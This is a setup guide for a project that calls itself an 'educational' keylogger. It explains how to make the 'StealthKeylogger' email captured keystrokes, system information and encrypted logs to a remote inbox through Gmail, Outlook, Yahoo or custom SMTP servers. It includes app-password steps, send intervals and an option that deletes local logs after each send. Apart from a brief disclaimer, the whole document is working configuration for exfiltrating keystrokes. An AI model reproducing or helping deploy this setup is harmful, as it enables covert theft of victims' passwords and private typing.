# Email Transmission Setup Guide

This guide explains how to configure the educational keylogger to send logs via email automatically.

## 📧 Email Configuration Options

The keylogger supports multiple email providers and can send logs automatically at specified intervals.

### 🔧 Configuration Settings

#### 1. Enable Email Transmission

```json
"transmission": {
  "enabled": true,          // Enable automatic transmission
  "method": "email",        // Use email method
  "interval_hours": 24,     // Send every 24 hours (or 0.1 for 6 minutes for testing)
  "delete_after_send": true, // Delete local logs after sending
  "retry_attempts": 3,      // Retry 3 times if failed
  "compress_before_send": true // Compress logs before sending
}
```

#### 2. Email Provider Settings

```json
"email": {
  "enabled": true,
  "smtp_server": "smtp.gmail.com",
  "smtp_port": 587,
  "use_tls": true,
  "sender_email": "your_email@gmail.com",
  "sender_password": "your_app_password",
  "recipient_email": "your_email@gmail.com",
  "subject_prefix": "Keylogger Report"
}
```

## 🌐 Supported Email Providers

### Gmail Configuration
```json
"smtp_server": "smtp.gmail.com",
"smtp_port": 587,
"use_tls": true
```
**Requirements:**
- Enable 2-factor authentication
- Generate App Password (not regular password)
- Use App Password in `sender_password` field

### Outlook/Hotmail Configuration
```json
"smtp_server": "smtp-mail.outlook.com",
"smtp_port": 587,
"use_tls": true
```

### Yahoo Mail Configuration
```json
"smtp_server": "smtp.mail.yahoo.com",
"smtp_port": 587,
"use_tls": true
```

### Custom SMTP Server
```json
"smtp_server": "your.smtp.server.com",
"smtp_port": 465,          // or 587
"use_tls": true            // or false for port 25
```

## 🔐 Security Setup (Gmail Example)

### Step 1: Enable 2-Factor Authentication
1. Go to Google Account Settings
2. Security → 2-Step Verification
3. Enable 2-factor authentication

### Step 2: Generate App Password
1. Google Account → Security → 2-Step Verification
2. Scroll down to "App passwords"
3. Select "Mail" and "Other (custom name)"
4. Enter "Educational Keylogger"
5. Copy the generated 16-character password

### Step 3: Configure the Keylogger
```json
"sender_email": "youremail@gmail.com",
"sender_password": "abcd efgh ijkl mnop",  // App password (with spaces)
"recipient_email": "youremail@gmail.com"
```

## 🚀 Quick Setup Example

1. **Copy example configuration:**
   ```bash
   cp examples/email_demo_config.json config/email_config.json
   ```

2. **Edit email settings:**
   ```bash
   nano config/email_config.json
   ```

3. **Update these fields:**
   ```json
   "sender_email": "YOUR_EMAIL@gmail.com",
   "sender_password": "YOUR_APP_PASSWORD",
   "recipient_email": "RECIPIENT@gmail.com"
   ```

4. **Test the configuration:**
   ```bash
   python main.py --config config/email_config.json --test
   ```

5. **Run with email enabled:**
   ```bash
   python main.py --config config/email_config.json
   ```

## 📨 Email Content

The keylogger sends emails with:

- **Subject:** `[Educational Keylogger Demo] Keylog Report - YYYY-MM-DD HH:MM`
- **Body:** Summary of captured keystrokes and system info
- **Attachments:** 
  - Encrypted log file (.enc)
  - Plain text summary
  - System information

## ⚙️ Advanced Options

### Custom Intervals
```json
"interval_hours": 0.1,     // Every 6 minutes (for testing)
"interval_hours": 1,       // Every hour
"interval_hours": 12,      // Twice daily
"interval_hours": 24,      // Daily (recommended)
"interval_hours": 168      // Weekly
```

### Security Options
```json
"delete_after_send": true,     // Remove local logs after sending
"compress_before_send": true,  // Reduce file size
"retry_attempts": 3,          // Retry failed sends
```

## 🧪 Testing Email Functionality

### Quick Test (6-minute interval):
```bash
# Use demo config with short interval
python main.py --config examples/email_demo_config.json
```

### Manual Email Test:
```python
# Test script
import sys
sys.path.append('src')
from src.core.keylogger import StealthKeylogger

keylogger = StealthKeylogger('examples/email_demo_config.json')
keylogger.send_email_report()  # Send test email immediately
```

## ⚠️ Important Notes

### Legal & Ethical:
- **Only use on systems you own**
- **Get explicit permission for testing**
- **This is for educational purposes only**

### Security Considerations:
- App passwords are safer than regular passwords
- Use encrypted email services when possible
- Consider using temporary/dedicated email accounts for testing
- Never hardcode passwords in shared code

### Troubleshooting:
- Check firewall settings for SMTP ports
- Verify app password is correct (no regular password)
- Test with simple email client first
- Check spam/junk folders for test emails

## 📊 Email Report Example

```
Subject: [Educational Keylogger Demo] Keylog Report - 2025-09-28 14:30

Body:
Educational Keylogger Report
===========================
Timestamp: 2025-09-28 14:30:15
Duration: 6 minutes
Total Keystrokes: 247
Special Keys: 18
Windows Captured: 3

Summary:
- Most active application: Terminal (150 keystrokes)
- Common keys: SPACE (25), BACKSPACE (12), ENTER (8)
- Time period: 14:24:15 - 14:30:15

Attachments:
- keylog_encrypted.enc (secured log file)
- system_info.txt (system details)

This is an automated educational report.
```

This email functionality allows you to remotely monitor the keylogger's activity and receive regular reports for your educational analysis!